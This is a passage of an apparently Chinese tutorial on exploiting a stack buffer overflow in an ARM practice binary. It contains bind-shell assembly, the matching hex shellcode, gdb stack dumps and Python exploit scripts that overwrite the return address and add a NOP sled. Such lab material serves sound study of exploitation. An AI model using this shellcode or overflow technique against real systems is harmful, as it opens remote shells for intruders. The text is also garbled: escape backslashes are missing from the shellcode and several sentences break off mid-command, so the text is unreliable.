        //change stdin/stdout/stderr to /bin/sh
        mov r0, r4
        sub r1, r1, r1
        mov r7, #63
        svc #1
        mov r0, r4
        mov r1, #1
        svc #1
        mov r0, r4
        mov r1, #2
        svc #1
        //execve("/bin/sh")
        adr r0, bin_sh
        eor r1, r1, r1
        eor r2, r2, r2
        strb r2, [r0, #7]
        mov r7, #11
        svc #1
    local_addr:
    .ascii "x02xff"
    .ascii "x11x5c"
    .byte 1,1,1,1
    bin_sh:
    .ascii "/bin/shX"
`hexdump -v -e '"\""x" /1 "%02x" ""' bindshell.bin`生成十六进制的shellcode
`x01x30x8fxe2x13xffx2fxe1x02x20x01x21x92x1axc8x27x51x37x01xdfx04x1cx11xa1x4ax70x8ax80xc0x46x8ax71xcax71x10x22x01x37x01xdfx20x1cx02x21x02x37x01xdfx20x1cx49x40x52x40x01x37x01xdfx04x1cx20x1cx49x1ax3fx27x01xdfx20x1cx01x21x01xdfx20x1cx02x21x01xdfx04xa0x49x40x52x40xc2x71x0bx27x01xdfx02xffx11x5cx01x01x01x01x2fx62x69x6ex2fx73x68x58`
写好shellcode之后，我们需要找到`合适的位置`，存放好shellcode保证程序可以正常执行shellcode，根据上面的分析，可以得到返回地址`0xb6e8c294`存放的内存地址是0xbefff124+8=`0xbefff12c`，而我们溢出的数据会一直向栈空间下面延伸，所以我们可以`将返回地址改成0xbefff12c+4`的位置，这样就会执行到后面的shellcode代码
    0xbefff124: 0x00000000  0x00000000  0xb6e8c294
第一步：现将返回地址覆盖为`0xbefff130`，这里我使用python脚本来实现填充字符、和返回地址的覆盖。然后`python poc.py
>exp`,把shellcode写入exp文件，在gdb里使用`r  0xb6fb1000 -> 0x0013cf20     0x0013cf20
然后在python脚本内再添加shellcode后，完整的脚本如下：
    import struct
    padding = "111111111111111111111111111111111111111111111111111111111111111111111111"
    return_addr = struct.pack("I", 0xbefff130)
    payload = "x01x30x8fxe2x13xffx2fxe1x02x20x01x21x92x1axc8x27x51x37x01xdfx04x1cx11xa1x4ax70x8ax80xc0x46x8ax71xcax71x10x22x01x37x01xdfx20x1cx02x21x02x37x01xdfx20x1cx49x40x52x40x01x37x01xdfx04x1cx20x1cx49x1ax3fx27x01xdfx20x1cx01x21x01xdfx20x1cx02x21x01xdfx04xa0x49x40x52x40xc2x71x0bx27x01xdfx02xffx11x5cx01x01x01x01x2fx62x69x6ex2fx73x68x58"
    print padding + return_addr + payload
当我们使用`gdb`运行`r  r  define hook-stop
    Type commands for definition of "hook-stop".
    End with a line saying just "end".
    >x/8wx $sp
    >end
返回栈数据结果
    gdb ./stack0
    0xbefff128:    0x31313131    0xbefff130    0xe28f3001    0xe12fff13
    0xbefff138:    0x21012002    0x27c81a92    0xdf013751    0xa1111c04
    gdb /home/pi/Desktop/ARM-challenges/stack0
    0xbefff138:    0x00000000    0xb6e8c294    0xb6fb1000    0xbefff294
    0xbefff148:    0x00000001    0x0001044c    0xb6ffe0b8    0xb6ffddc0
下面尝试打印1000行栈数据`x/1000s
$sp`，观察不同，具体不同的地方就是存放环境变量的地方，如下所示，地址`0xbefffcdd`的数据还是相同的，但是因为`pwd变量的长度不一致，导致了需用用更多的栈空间存储多余的数据，所以从这往后，栈内数据发生了变化`
    gdb ./stack0的输出
    0xbefffc8c:    "_=/usr/bin/gdb"
    0xbefffc9b:    "LC_IDENTIFICATION=zh_CN.UTF-8"
    0xbefffcb9:    "PWD=/home/pi/Desktop/ARM-challenges"
    0xbefffcdd:    "LANG=en_GB.UTF-8"
    gdb /home/pi/Desktop/ARM-challenges/stack0的输出
    0xbefffc9b:    "_=/usr/bin/gdb"
    0xbefffcaa:    "LC_IDENTIFICATION=zh_CN.UTF-8"
    0xbefffcc8:    "PWD=/home/pi/Desktop"
    0xbefffcdd:    "LANG=en_GB.UTF-8"
**具体解决方案：**
  * 执行前删除环境变量
    shell$ env -i ./stack0
    (gdb) unset env
  * `NOP`:使用NOP滑到我们的shellcode处，然后我们将加入100个NOP到shellcode中，下面这个python脚本才是最终的脚本！
    import struct
    padding = "111111111111111111111111111111111111111111111111111111111111111111111111"
    return_addr = struct.pack("I", 0xbefff130)
    payload = "x01x30x8fxe2x13xffx2fxe1x02x20x01x21x92x1axc8x27x51x37x01xdfx04x1cx11xa1x4ax70x8ax80xc0x46x8ax71xcax71x10x22x01x37x01xdfx20x1cx02x21x02x37x01xdfx20x1cx49x40x52x40x01x37x01xdfx04x1cx20x1cx49x1ax3fx27x01xdfx20x1cx01x21x01xdfx20x1cx02x21x01xdfx04xa0x49x40x52x40xc2x71x0bx27x01xdfx02xffx11x5cx01x01x01x01x2fx62x69x6ex2fx73x68x58"
    print padding + return_addr + "x90"*100 + payload
至此我们解决了环境变量引起的`栈数据移动问题`，当我们在次执行`./stack0  附录文章：  
>  [1] ARM汇编学习网站  
>  [2] 实战样本下载地址  
>  [3] shellcode学习编写地址  
>  [4]
> 在溢出中使用shellcode教程